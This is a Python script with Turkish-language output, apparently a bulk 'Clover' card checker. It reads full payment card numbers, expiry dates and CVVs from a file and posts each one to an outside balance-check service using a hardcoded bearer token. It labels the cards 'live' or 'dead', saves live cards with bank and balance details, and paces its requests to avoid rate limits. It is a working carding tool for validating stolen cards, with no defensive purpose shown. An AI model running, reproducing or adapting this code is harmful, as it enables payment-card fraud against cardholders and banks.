#!/usr/bin/env python3
"""
KART SORGULAMA - Clover Bulk Live (Düşük paralel, tam kart gösterimi)
"""

import requests
import os
import json
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ================== KONFİGÜRASYON ==================
API_URL = "https://jokerbalancecheck.onrender.com/clover/verify"
AUTH_TOKEN = "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025"
INPUT_FILE = "output.txt"
OUTPUT_FILE = "live.txt"
MAX_WORKERS = 2  # 🔥 20'den 2'ye düşürüldü
TIMEOUT = 45     # 30'dan 45'e çıkarıldı
BATCH_SIZE = 20  # 50'den 20'ye düşürüldü
DELAY_BETWEEN_CARDS = 2  # 🔥 YENİ: Her kart arası 2 saniye bekle

# ================== GLOBAL DEĞİŞKENLER ==================
print_lock = Lock()
live_count = 0
dead_count = 0
total_cards = 0
processed = 0
start_time = None

# ================== FONKSİYONLAR ==================

def print_progress():
    """İlerlemeyi göster"""
    global processed, total_cards, live_count, dead_count, start_time
    
    if total_cards == 0:
        return
    
    elapsed = time.time() - start_time if start_time else 0
    percent = (processed / total_cards * 100) if total_cards > 0 else 0
    rate = processed / elapsed if elapsed > 0 else 0
    
    if processed % 5 == 0 or percent % 5 < 1:
        print(f"\r   📊 {processed}/{total_cards} ({percent:.1f}%) | ✅ {live_count} | ❌ {dead_count} | {rate:.1f} kart/sn", end='', flush=True)

def process_card(card_line, index):
    """
    Tek bir kartı Clover API ile kontrol et
    """
    global live_count, dead_count, processed
    
    try:
        # Kartı parse et
        parts = card_line.strip().split('|')
        if len(parts) < 4:
            with print_lock:
                dead_count += 1
                processed += 1
            return False
        
        pan = parts[0].strip()
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        cvv = parts[3].strip()
        
        if len(year) == 2:
            year = f"20{year}"
        
        # Clover verify endpoint'ine istek gönder
        headers = {
            "Authorization": f"Bearer {AUTH_TOKEN}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "card": f"{pan}|{month}|{year}|{cvv}"
        }
        
        response = requests.post(
            API_URL,
            json=payload,
            headers=headers,
            timeout=TIMEOUT
        )
        
        with print_lock:
            processed += 1
        
        if response.status_code == 200:
            result = response.json()
            
            if result.get('live', False):
                with print_lock:
                    live_count += 1
                    bin_info = result.get('bin', {})
                    balance = result.get('balance', '0.00')
                    gateway = result.get('gateway', 'Clover_Charge')
                    transaction_id = result.get('transaction_id', '')
                    
                    # Live kartı kaydet
                    live_line = f"{pan}|{month}|{year}|{cvv}|{bin_info.get('country', 'XX')}|{bin_info.get('bank', 'Unknown')}|{bin_info.get('type', 'UNKNOWN')}|{bin_info.get('level', 'UNKNOWN')}|{balance}|{gateway}|{transaction_id}"
                    
                    with open(OUTPUT_FILE, 'a') as lf:
                        lf.write(live_line + '\n')
                    
                    print(f"\n   ✅ [{index}] LIVE: {pan}|{month}|{year}|{cvv} | ${balance} | {gateway}")
                    print_progress()
                    return True
            else:
                with print_lock:
                    dead_count += 1
                error = result.get('error', '')
                if error:
                    print(f"\n   ❌ [{index}] DEAD: {pan}|{month}|{year}|{cvv} | {error[:50]}")
                else:
                    print(f"\n   ❌ [{index}] DEAD: {pan}|{month}|{year}|{cvv}")
                print_progress()
                return False
        else:
            with print_lock:
                dead_count += 1
            print(f"\n   ⚠️ [{index}] HTTP {response.status_code}: {pan}|{month}|{year}|{cvv}")
            print_progress()
            return False
                
    except requests.exceptions.Timeout:
        with print_lock:
            dead_count += 1
            processed += 1
        print(f"\n   ⏱️ [{index}] Zaman aşımı: {pan}|{month}|{year}|{cvv}")
        print_progress()
        return False
    except requests.exceptions.ConnectionError:
        with print_lock:
            dead_count += 1
            processed += 1
        print(f"\n   🔌 [{index}] Bağlantı hatası: {pan}|{month}|{year}|{cvv}")
        print_progress()
        return False
    except Exception as e:
        with print_lock:
            dead_count += 1
            processed += 1
        print(f"\n   ❌ [{index}] Hata: {str(e)[:50]}: {pan}|{month}|{year}|{cvv}")
        print_progress()
        return False

def process_batch(batch_cards, batch_num, total_batches):
    """
    Bir batch'i işle (her kart arasında 2 sn bekle)
    """
    print(f"\n[Batch {batch_num}/{total_batches}] {len(batch_cards)} kart işleniyor...")
    
    with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(batch_cards))) as executor:
        futures = {executor.submit(process_card, card, i+1): i+1 for i, card in enumerate(batch_cards)}
        
        for future in as_completed(futures):
            try:
                future.result()
                # 🔥 Her kart işleminden sonra 2 saniye bekle
                time.sleep(DELAY_BETWEEN_CARDS)
            except Exception as e:
                print(f"\n[!] Batch {batch_num} işlem hatası: {e}")

def main():
    global total_cards, start_time, processed, live_count, dead_count
    
    print("=" * 70)
    print("   🔥 KART SORGULAMA - Clover Bulk Live 🔥")
    print("=" * 70)
    print(f"[+] API: {API_URL}")
    print(f"[+] Input: {INPUT_FILE}")
    print(f"[+] Output: {OUTPUT_FILE}")
    print(f"[+] Batch boyutu: {BATCH_SIZE}")
    print(f"[+] Paralel işlem: {MAX_WORKERS}")
    print(f"[+] Timeout: {TIMEOUT}s")
    print(f"[+] Kart arası bekleme: {DELAY_BETWEEN_CARDS}s")
    print("=" * 70)
    
    # Giriş dosyasını kontrol et
    if not os.path.exists(INPUT_FILE):
        print(f"[!] {INPUT_FILE} bulunamadı!")
        print(f"[!] Mevcut dosyalar:")
        for f in os.listdir('.'):
            if f.endswith('.txt'):
                file_size = os.path.getsize(f) / 1024
                print(f"    - {f} ({file_size:.1f} KB)")
        return
    
    # Kartları oku
    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    total_cards = len(cards)
    print(f"[+] {total_cards} kart okundu: {INPUT_FILE}")
    print(f"[+] Dosya boyutu: {os.path.getsize(INPUT_FILE) / 1024:.1f} KB")
    
    # Çıktı dosyasını temizle
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
        print(f"[+] Eski {OUTPUT_FILE} silindi")
    
    # Batch'lere ayır
    batches = [cards[i:i+BATCH_SIZE] for i in range(0, total_cards, BATCH_SIZE)]
    total_batches = len(batches)
    
    print(f"[+] {total_batches} batch oluşturuldu")
    print("=" * 70)
    
    start_time = time.time()
    
    # Batch'leri işle
    for i, batch in enumerate(batches):
        batch_num = i + 1
        process_batch(batch, batch_num, total_batches)
        
        # Batch arası bekle (rate limiting)
        if i < len(batches) - 1:
            print(f"\n⏳ Batch arası 3 saniye bekleniyor...")
            time.sleep(3)
    
    elapsed = time.time() - start_time
    
    # İlerlemeyi temizle
    print("\r" + " " * 70, end='')
    print("\r", end='')
    
    # Özet
    print("\n" + "=" * 70)
    print(f"[✓] İŞLEM TAMAMLANDI!")
    print(f"[✓] Süre: {elapsed:.1f} saniye")
    print(f"[✓] Toplam: {total_cards} kart")
    print(f"[✓] Canlı: {live_count} kart")
    print(f"[✓] Ölü: {dead_count} kart")
    if total_cards > 0:
        print(f"[✓] Başarı oranı: {(live_count/total_cards*100):.1f}%")
        print(f"[✓] Hız: {total_cards/elapsed:.2f} kart/sn")
    print(f"[✓] Kaydedildi: {OUTPUT_FILE}")
    
    # Live kartları göster
    if live_count > 0 and os.path.exists(OUTPUT_FILE):
        print("\n[+] Live kartlar (ilk 10):")
        with open(OUTPUT_FILE, 'r') as f:
            lines = f.readlines()
            for line in lines[:10]:
                parts = line.strip().split('|')
                if len(parts) >= 5:
                    pan = parts[0]
                    month = parts[1]
                    year = parts[2]
                    cvv = parts[3]
                    balance = parts[8] if len(parts) > 8 else "0.00"
                    gateway = parts[9] if len(parts) > 9 else "unknown"
                    print(f"   💳 {pan}|{month}|{year}|{cvv} | ${balance} | {gateway}")
        
        print(f"\n[+] Toplam {len(lines)} live kart kaydedildi")

if __name__ == "__main__":
    main()

 